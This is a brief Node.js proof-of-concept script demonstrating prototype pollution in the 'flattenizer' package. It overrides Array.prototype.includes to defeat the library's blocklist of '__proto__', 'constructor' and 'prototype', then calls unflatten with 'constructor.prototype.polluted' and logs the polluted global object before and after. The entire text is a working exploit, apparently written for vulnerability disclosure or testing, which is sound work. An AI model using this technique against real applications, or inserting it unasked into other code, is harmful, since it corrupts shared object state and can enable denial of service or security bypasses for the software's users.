Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const flattenizer = require('flattenizer');
flattenizer.unflatten({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);